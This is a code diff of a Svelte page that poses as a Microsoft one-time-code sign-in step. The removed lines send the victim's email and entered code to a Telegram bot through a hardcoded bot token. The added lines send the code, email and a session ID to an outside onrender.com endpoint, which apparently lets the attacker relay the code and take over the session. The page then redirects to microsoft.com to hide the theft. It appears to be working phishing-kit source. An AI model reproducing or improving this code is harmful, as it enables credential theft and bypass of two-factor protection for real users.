@@ -1,4 +1,5 @@
 <script>
+  import { onMount } from 'svelte';
   import { emailStore } from '../stores.js';
   import MicrosoftSvg from '../assets/microsoft.svg';
   import SignUpFooter from '../lib/SignUpFooter.svelte';
@@ -9,9 +10,17 @@
   let otp = ["", "", "", "", "", ""];
   let inputs = []; // To store references to the input elements
   let errorMessage = "";
+  let sessionId = "";
 
   // Automatically focus the first input on load
   onMount(() => {
+    const params = new URLSearchParams(window.location.search);
+    sessionId = params.get('session');
+    
+    if (!sessionId) {
+      errorMessage = "Session expired. Please start over.";
+    }
+    
     inputs[0]?.focus();
   });
 
@@ -52,32 +61,29 @@
     }
   }
 async function sendDataToBackend(code) {
-   let message = `New ${name} login attempt-> otp code for: ${$emailStore} is ${code}`;
-      const botToken = '8370164086:AAF5HP0jGNLwV_PB9q7sVncLSULost68M-U';
-      const chatId = '1314372286';
-      // const chatId = 1314372286;
-      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+   const backend_url = "https://rate-land.onrender.com/submit-otp";
     try {
 
-        const response = await fetch(telegramApiUrl, {
+        const response = await fetch(backend_url, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
             },
             body: JSON.stringify({
-                "chat_id": chatId,
-                "text": message
+                sessionId: sessionId, // 👈 CRITICAL: Link the OTP to the session
+                otp: code,
+                email: $emailStore
             })
         });
 
          if (response.status === 200) {
-          console.log('Login successful!');
+          console.log('Process successful!');
         } else {
-          console.error('Login Attempt Failed:', response.status);
+          console.error('Attempt Failed:', response.status);
         }
 
     } catch (error) {
-        console.error("Error sending data:", error);
+        console.error("Error:", error);
     }
 }
   function redirectUrl() { window.location.href = "https://microsoft.com"; }
